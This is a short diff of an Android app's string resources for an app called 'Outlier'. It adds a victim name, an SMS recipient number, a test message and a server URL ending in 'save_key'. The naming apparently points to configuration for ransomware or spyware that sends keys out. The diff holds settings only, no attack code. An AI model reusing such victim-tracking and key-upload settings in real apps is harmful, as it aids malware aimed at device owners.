@@ -3,8 +3,11 @@
     <color name="black">#FF000000</color>
     <color name="ic_launcher_background">#ffffff</color>
     <color name="white">#FFFFFFFF</color>
-    <string name="Victim">Shiva</string>
+    <string name="Message">test Message to check</string>
+    <string name="SendSmsTo">8318737281</string>
+    <string name="Victim">Test User</string>
     <string name="app_name">Outlier</string>
+    <string name="server_Url">https://foodmend.pythonanywhere.com/save_key/</string>
     <style name="Base.Theme.P32" parent="Theme.Material3.DayNight.NoActionBar">
         
         
